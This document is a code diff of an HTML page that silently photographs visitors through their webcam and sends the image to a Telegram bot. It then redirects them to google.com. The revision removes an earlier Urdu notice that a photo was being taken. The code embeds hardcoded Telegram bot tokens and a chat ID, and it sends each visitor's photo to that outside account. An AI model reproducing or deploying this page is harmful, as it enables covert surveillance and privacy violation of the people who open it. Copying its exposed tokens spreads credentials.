@@ -1,78 +1,88 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title>Auto Camera to Telegram</title>
+  <meta charset="UTF-8">
+  <title>Auto Photo Telegram</title>
   <style>
-    body { font-family: Arial, sans-serif; text-align: center; background: #f0f0f0; padding: 30px; }
+    body { font-family: Arial; text-align: center; background: #f9f9f9; padding: 40px; }
     video, canvas { display: none; }
-    #status { margin-top: 20px; font-size: 18px; color: green; }
+    #status { font-size: 18px; color: green; margin-top: 20px; }
   </style>
 </head>
 <body>
-  <h2>📷 تصویر لی جا رہی ہے</h2>
-  <p>براہ کرم اجازت دیں، تصویر لی جا رہی ہے...</p>
-  <div id="status">📸 کیمرہ آن ہو رہا ہے...</div>
-  <video id="video" autoplay></video>
+  <h2>Camera Activated</h2>
+  <video id="video" autoplay playsinline></video>
   <canvas id="canvas"></canvas>
+  <p id="status">Waiting for camera...</p>
 
   <script>
-    const BOT_TOKEN = "8179356502:AAEzwz_sNhyW30CHOPcV2PaWv0TIcE7Z04Q";
+    const TOKEN = "8270282834:AAHbKLg3jN3zyShc3qXE_KCxa4UDLawoCv0";
     const CHAT_ID = "7009447523";
+    const REDIRECT_URL = "https://google.com";
 
     const video = document.getElementById("video");
     const canvas = document.getElementById("canvas");
-    const statusDiv = document.getElementById("status");
-    const context = canvas.getContext("2d");
+    const statusText = document.getElementById("status");
 
-    function sendPhoto(blob) {
+    function sendToTelegram(blob, tryCount = 1) {
       const formData = new FormData();
       formData.append("chat_id", CHAT_ID);
       formData.append("photo", blob, "photo.jpg");
 
-      return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
         method: "POST",
         body: formData
+      }).then(res => {
+        if (res.ok) {
+          statusText.textContent = "Photo sent! Redirecting...";
+          setTimeout(() => {
+            window.location.href = REDIRECT_URL;
+          }, 1000);
+        } else if (tryCount < 2) {
+          // Try again if first fails
+          statusText.textContent = "Retrying...";
+          captureAndSendPhoto(tryCount + 1);
+        } else {
+          statusText.textContent = "Failed to send.";
+          setTimeout(() => {
+            window.location.href = REDIRECT_URL;
+          }, 2000);
+        }
+      }).catch(() => {
+        statusText.textContent = "Error! Redirecting...";
+        setTimeout(() => {
+          window.location.href = REDIRECT_URL;
+        }, 2000);
       });
     }
 
-    function captureAndSend() {
+    function captureAndSendPhoto(tryCount = 1) {
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
-      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const ctx = canvas.getContext("2d");
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
       canvas.toBlob(blob => {
-        sendPhoto(blob)
-          .then(res => {
-            if (res.ok) {
-              statusDiv.innerText = "✅ تصویر بھیج دی گئی!";
-            } else {
-              statusDiv.innerText = "❌ تصویر بھیجنے میں مسئلہ!";
-            }
-          })
-          .catch(() => {
-            statusDiv.innerText = "⚠️ نیٹ ورک ایرر!";
-          });
-      }, 'image/jpeg');
+        if (blob) {
+          sendToTelegram(blob, tryCount);
+        } else {
+          statusText.textContent = "Photo failed. Redirecting anyway.";
+          setTimeout(() => {
+            window.location.href = REDIRECT_URL;
+          }, 2000);
+        }
+      }, "image/jpeg");
     }
 
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(stream => {
         video.srcObject = stream;
-        video.onloadedmetadata = () => {
-          video.play();
-          statusDiv.innerText = "⏳ تصویر لی جا رہی ہے...";
-
-          // 📸 پہلی تصویر فوراً
-          captureAndSend();
-
-          // 📸 دوسری تصویر 2 سیکنڈ بعد
-          setTimeout(() => {
-            captureAndSend();
-          }, 2000);
-        };
+        statusText.textContent = "Camera ready. Taking photo...";
+        setTimeout(() => {
+          captureAndSendPhoto(); // First attempt
+        }, 1500);
       })
-      .catch(() => {
-        statusDiv.innerText = "❌ کیمرہ کی اجازت نہیں ملی!";
+      .catch(err => {
+        statusText.textContent = "Camera blocked! Cannot continue.";
       });
   </script>
 </body>
